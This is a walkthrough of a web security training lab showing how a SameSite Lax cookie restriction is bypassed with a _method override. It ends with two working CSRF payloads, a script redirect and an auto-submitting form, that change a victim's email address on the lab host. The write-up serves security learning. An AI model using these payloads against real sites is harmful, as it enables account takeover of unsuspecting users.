Title: SameSite Lax bypass via method override
Level: PRACTITIONER
Desc:  This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough:
session cookie don't have SameSite flag so it is by default Lax.

The request to change email is like that: 
<img width="1116" height="388" alt="image" src="https://github.com/user-attachments/assets/d11b5395-1507-4f1c-8bc2-3fe749caaa8f" />
So it doesn't use csrf token, only protection here is cookie with Lax policy.

Lax policy states, that cookie will be added to requests with get method, so I try get method: 
<img width="1069" height="414" alt="image" src="https://github.com/user-attachments/assets/1c6a3788-b170-484b-b260-562c51e51aeb" />

Method not allowed. 

I tried to change method from POST to GET by using _method parameter:
<img width="935" height="426" alt="image" src="https://github.com/user-attachments/assets/b537c186-2db0-4927-b7f0-4c83fc4777a1" />
It worked!

Crafting exploit:
```
<script>
    document.location = "https://0a63007e03d0bc8d805117e600d700cb.web-security-academy.net/my-account/change-email?email=en22er%40normal-user.net&_method=POST";
</script>
```

Also it works:
```
<form action="https://0a63007e03d0bc8d805117e600d700cb.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="email" value="test321@normal-user.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
